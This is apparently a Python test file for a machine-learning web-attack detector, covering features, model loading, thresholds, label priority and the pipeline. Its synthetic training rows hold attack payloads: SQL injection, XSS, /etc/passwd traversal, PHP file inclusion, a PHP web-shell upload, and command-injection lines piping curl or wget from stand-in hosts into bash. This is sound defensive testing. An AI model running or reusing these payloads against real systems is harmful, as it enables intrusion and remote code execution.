"""第二层 ML 检测器（m1-ml-1.0）测试：特征、加载降级、阈值门控、标签优先级、管线端到端。

普通回归（tests/test_m1.py 等）通过 test_workspace 显式关闭 ML；本文件用临时目录
训练小模型单独开启 ML 验证，不依赖仓库公共模型工件。
"""
import json
import shutil
import sys
import unittest
from pathlib import Path
from unittest.mock import patch

PROJECT = Path(__file__).resolve().parents[1]
if str(PROJECT) not in sys.path:
    sys.path.insert(0, str(PROJECT))

import lightgbm as lgb  # noqa: E402
import numpy as np  # noqa: E402

from bridge.labels import label_for  # noqa: E402
from m1.l2 import family  # noqa: E402
from m1.ml_detector import META_FILE, MODEL_FILE, MLDetector  # noqa: E402
from m1.ml_features import FEATURE_NAMES, RISK_ML, extract_features  # noqa: E402
from m1.run import RISK, process_task  # noqa: E402

BROWSER_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
TS = "2026-08-01T10:00:00+00:00"


def row(label: str, body: str = "", url: str = "/index.html", method: str = "GET",
        src: str = "10.1.1.9", ua: str = BROWSER_UA) -> dict:
    return {"timestamp": TS, "user_agent": ua, "method": method, "src_ip": src,
            "dst_ip": "10.0.0.12", "url_path": url, "request_body": body, "_truth": label}


def synthetic_rows(per_class: int = 40) -> list[dict]:
    """关键词驱动的 9 类合成数据（真实官方词汇），只用于小模型训练。"""
    payloads = {
        "SQL注入攻击": ["' or '1'='1' --", "1 union all select user,password from information_schema.tables",
                        "admin' and sleep(5) --"],
        "XSS跨站脚本攻击": ["<script>alert(document.cookie)</script>", "<img src=x onerror=alert(1)>",
                            "<iframe src=javascript:alert(1)>"],
        "目录遍历攻击": ["../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "/download?file=....//....//boot.ini"],
        "文件包含攻击": ["php://filter/read=convert.base64-encode/resource=index.php",
                        "/view.php?include=file:///etc/passwd", "page=data://text/plain,<?php system('id')?>"],
        "远程命令执行攻击": ["; cat /etc/passwd whoami", "127.0.0.1 | wget http://evil.example/x.sh",
                            "; curl http://c2.example/sh | bash ; uname -a"],
        "CSRF攻击": ["to=attacker@evil.example&confirm=1", "role=admin&setting=disable",
                     "new_password=pwned&confirm_password=pwned"],
        "Java反序列化漏洞利用攻击": ["rO0ABAc ed0005 000073720014 java.util.PriorityQueue readObject",
                                    "%ac%ed%00%05 sr %00 java.lang.Runtime", "java.util.HashMap readObject commons-collections"],
        "文件上传攻击": ["--boundary\r\nContent-Disposition: form-data; name=\"f\"; filename=\"shell.php\"\r\n\r\n<?php system($_GET['c']); ?>",
                        "--boundary\r\nContent-Disposition: form-data; name=\"f\"; filename=\"cmd.jsp\"",
                        "--boundary\r\nContent-Disposition: form-data; name=\"f\"; filename=\"up.aspx\""],
    }
    normal = [("", "/index.html"), ("", "/about/team"), ("id=42", "/products/42"),
              ("q=network+security", "/search"), ("", "/help/faq")]
    rows: list[dict] = []
    for label, bodies in payloads.items():
        for i in range(per_class):
            rows.append(row(label, bodies[i % len(bodies)],
                            url="/api/submit" if label in ("CSRF攻击", "文件上传攻击") else "/query",
                            method="POST", src=f"10.2.{i % 250}.7",
                            ua="sqlmap/1.7" if i % 5 == 0 else BROWSER_UA))
    for i in range(per_class * 3):  # 正常类占比与真实数据接近
        body, url = normal[i % len(normal)]
        rows.append(row("正常访问", body, url=url, src=f"10.3.{i % 250}.7"))
    return rows


def train_tiny_model(model_dir: Path, rows: list[dict]) -> list[str]:
    """在临时目录训练小模型并写出 model+meta；返回类别索引顺序。"""
    rows = [dict(item) for item in rows]
    labels = [item.pop("_truth") for item in rows]
    classes = sorted(set(labels))
    x = np.array([extract_features(item) for item in rows], dtype=np.float64)
    y = np.array([classes.index(label) for label in labels], dtype=np.int32)
    dataset = lgb.Dataset(x, label=y, feature_name=FEATURE_NAMES(), free_raw_data=False)
    booster = lgb.train({"objective": "multiclass", "num_class": len(classes), "metric": "multi_logloss",
                         "learning_rate": 0.2, "num_leaves": 31, "min_data_in_leaf": 5,
                         "seed": 7, "verbosity": -1}, dataset, num_boost_round=60)
    model_dir.mkdir(parents=True, exist_ok=True)
    booster.save_model(str(model_dir / MODEL_FILE))
    thresholds = {label: 0.5 for label in classes if label != "正常访问"}
    (model_dir / META_FILE).write_text(json.dumps({
        "ml_version": "m1-ml-1.0-test", "classes": classes,
        "feature_names": FEATURE_NAMES(), "thresholds": thresholds,
        "note": "测试用小模型，模型分数未经校准",
    }, ensure_ascii=False), encoding="utf-8")
    return classes


class FeatureTest(unittest.TestCase):
    def test_feature_names_match_vector_and_deterministic(self):
        sample = row("远程命令执行攻击", "; cat /etc/passwd whoami")
        first = extract_features(sample)
        second = extract_features(dict(sample))
        self.assertEqual(len(FEATURE_NAMES()), len(first))
        self.assertEqual(first, second)
        # 关键词特征确实点亮（RCE 载荷）
        names = FEATURE_NAMES()
        self.assertGreater(first[names.index("body_kw_rce")], 0)
        self.assertGreater(first[names.index("body_length")], 0)

    def test_ml_risk_scores_below_deterministic_rules(self):
        pairs = {"ml_command_injection": "command_injection", "ml_sql_injection": "sql_injection",
                 "ml_java_deserialization": "java_deserialization", "ml_file_inclusion": "file_inclusion",
                 "ml_file_upload": "file_upload", "ml_path_traversal": "path_traversal",
                 "ml_xss": "xss", "ml_csrf": "csrf"}
        from m1.run import RULES  # noqa: F401  确认 run.py 已导入
        for ml_name, base_name in pairs.items():
            self.assertIn(ml_name, RISK, f"{ml_name} 缺少 RISK 条目（l3_candidates 分桶依赖）")
            self.assertLess(RISK[ml_name], RISK[base_name], "ML 分数必须低于对应确定性规则")


class DetectorLoadTest(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(".test-workspaces") / "ml_detector_tests"
        self.tmp.mkdir(parents=True, exist_ok=True)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_missing_model_degrades(self):
        detector = MLDetector(self.tmp / "none", enabled=True)
        self.assertEqual(detector.status, "missing")
        detector.apply_batch([{"_ml_features": extract_features(row("正常访问"))}])
        self.assertEqual(detector.calls, 0)

    def test_disabled(self):
        detector = MLDetector(self.tmp / "none", enabled=False)
        self.assertEqual(detector.status, "disabled")

    def test_corrupt_model_reports_error_and_pipeline_shape(self):
        bad = self.tmp / "bad"
        bad.mkdir()
        (bad / MODEL_FILE).write_text("not a lightgbm model", encoding="utf-8")
        (bad / META_FILE).write_text("{}", encoding="utf-8")
        detector = MLDetector(bad, enabled=True)
        self.assertEqual(detector.status, "error")
        self.assertIn("detail", detector.snapshot())

    def test_predict_stage_degradation_counts_errors(self):
        model_dir = self.tmp / "predict_fail"
        train_tiny_model(model_dir, synthetic_rows(per_class=12))
        detector = MLDetector(model_dir, enabled=True)
        self.assertEqual(detector.status, "ready")
        event = {"event_id": "e1", "_ml_features": extract_features(row("正常访问"))}
        with patch.object(detector.booster, "predict", side_effect=RuntimeError("boom")):
            detector.apply_batch([event])
            detector.apply_batch([event])
            detector.apply_batch([event])
        self.assertGreaterEqual(detector.errors, 3)
        self.assertEqual(detector.status, "error")  # 连续失败翻转状态，防降级假通过
        self.assertEqual(detector.calls, 0)
        self.assertEqual(event.get("rule_hits"), None)

    def test_feature_drift_detected(self):
        model_dir = self.tmp / "drift"
        train_tiny_model(model_dir, synthetic_rows(per_class=10))
        meta = json.loads((model_dir / META_FILE).read_text(encoding="utf-8"))
        meta["feature_names"] = meta["feature_names"][:-1]  # 模拟漂移
        (model_dir / META_FILE).write_text(json.dumps(meta, ensure_ascii=False), encoding="utf-8")
        self.assertEqual(MLDetector(model_dir, enabled=True).status, "error")


class DetectorDecisionTest(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(".test-workspaces") / "ml_detector_decide"
        self.tmp.mkdir(parents=True, exist_ok=True)
        self.classes = train_tiny_model(self.tmp / "model", synthetic_rows(per_class=40))
        self.detector = MLDetector(self.tmp / "model", enabled=True)
        self.assertEqual(self.detector.status, "ready")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _events(self, label, count=1, **kwargs):
        return [{"event_id": f"e{i}", "_ml_features": extract_features(row(label, **kwargs))}
                for i in range(count)]

    def test_rce_payload_hits_with_full_evidence(self):
        events = self._events("远程命令执行攻击", body="; cat /etc/passwd whoami", method="POST", url="/api/exec")
        self.detector.apply_batch(events)
        self.assertGreaterEqual(self.detector.calls, 1)
        self.assertGreater(self.detector.hits.get("远程命令执行攻击", 0), 0)
        evidence = [e for e in events[0].get("evidence", []) if e.get("type") == "ml"]
        self.assertTrue(evidence)
        entry = evidence[0]
        for key in ("label", "score", "threshold", "model_version", "event_id", "name"):
            self.assertIn(key, entry)
        self.assertEqual(entry["label"], "远程命令执行攻击")
        self.assertEqual(entry["name"], "ml_command_injection")
        self.assertIn("ml_command_injection", events[0]["rule_hits"])
        self.assertEqual(events[0]["score_components"]["ml"], RISK_ML["ml_command_injection"])

    def test_low_score_below_threshold_never_hits(self):
        events = self._events("正常访问", body="hello world", url="/index.html")
        self.detector.apply_batch(events)
        self.assertEqual([e for e in events[0].get("evidence", []) if e.get("type") == "ml"], [])
        self.assertEqual(events[0].get("rule_hits"), None)
        self.assertEqual(self.detector.calls, 1)

    def test_snapshot_shape(self):
        snap = self.detector.snapshot()
        for key in ("status", "version", "classes", "whitelist", "calls", "hits", "errors", "detail"):
            self.assertIn(key, snap)
        self.assertEqual(snap["status"], "ready")


class LabelAndFamilyTest(unittest.TestCase):
    def test_ml_only_hit_maps_to_official_label(self):
        self.assertEqual(label_for(["ml_command_injection"]), "远程命令执行攻击")
        self.assertEqual(label_for(["ml_sql_injection"]), "SQL注入攻击")

    def test_deterministic_rule_beats_ml_on_conflict(self):
        self.assertEqual(label_for(["sql_injection", "ml_command_injection"]), "SQL注入攻击")
        self.assertEqual(label_for(["command_injection", "ml_sql_injection"]), "远程命令执行攻击")

    def test_unknown_rule_names_stay_pending(self):
        self.assertEqual(label_for(["prompt_injection"]), "待研判")
        self.assertEqual(label_for(["ioc_match"]), "待研判")

    def test_family_buckets_ml_hits_with_base_rule(self):
        self.assertEqual(family({"rule_hits": ["ml_sql_injection"]}), "web_exploitation")
        self.assertEqual(family({"rule_hits": ["ml_command_injection", "ml_xss"]}), "web_exploitation")


class PipelineEndToEndTest(unittest.TestCase):
    def test_ml_enabled_pipeline_attaches_session_evidence(self):
        import csv as _csv

        root = Path(".test-workspaces") / "ml_pipeline_e2e"
        shutil.rmtree(root, ignore_errors=True)
        try:
            model_dir = root / "model"
            classes = train_tiny_model(model_dir, synthetic_rows(per_class=30))
            (root / "m1").mkdir(parents=True)
            (root / "m1" / "config.json").write_text(json.dumps({
                "ml_detector": {"enabled": True, "model_dir": str(model_dir)},
                "output": {"format": "parquet", "require_parquet": True},
            }), encoding="utf-8")
            (root / "incoming").mkdir()
            rows = [row("远程命令执行攻击", "; cat /etc/passwd whoami", url="/api/exec", method="POST", src="10.4.1.7"),
                    row("正常访问", "", url="/index.html", src="10.4.1.9"),
                    row("正常访问", "id=7", url="/products/7", src="10.4.1.9")]
            headers = ["timestamp", "user_agent", "method", "src_ip", "dst_ip", "url_path", "request_body"]
            with (root / "incoming" / "ml.csv").open("w", encoding="utf-8", newline="") as stream:
                writer = _csv.DictWriter(stream, fieldnames=headers)
                writer.writeheader()
                for item in rows:
                    item.pop("_truth")
                    writer.writerow(item)
            published = process_task(root, {"task_id": "ml_e2e", "input_files": ["incoming/ml.csv"]})
            status = json.loads((published / "status.json").read_text(encoding="utf-8"))
            ml_status = status.get("ml_detector", {})
            self.assertEqual(ml_status.get("status"), "ready")
            self.assertGreater(ml_status.get("calls", 0), 0)

            import pyarrow.parquet as pq

            sessions = pq.read_table(published / "all_sessions.parquet").to_pylist()
            ml_sessions = [s for s in sessions if any(str(h).startswith("ml_") for h in (s.get("rule_hits") or []))]
            self.assertTrue(ml_sessions, "ML 命中未进入会话")
            session = ml_sessions[0]
            self.assertTrue(any(h == "ml_command_injection" for h in session["rule_hits"]))
            self.assertTrue((session.get("score_components") or {}).get("ml"), "finalize 丢失 score_components.ml")
            ml_evidence = [e for e in (session.get("evidence") or []) if e.get("type") == "ml"]
            self.assertTrue(ml_evidence)
            for key in ("label", "score", "threshold", "model_version", "event_id"):
                self.assertIn(key, ml_evidence[0])
        finally:
            shutil.rmtree(root, ignore_errors=True)


if __name__ == "__main__":
    unittest.main()
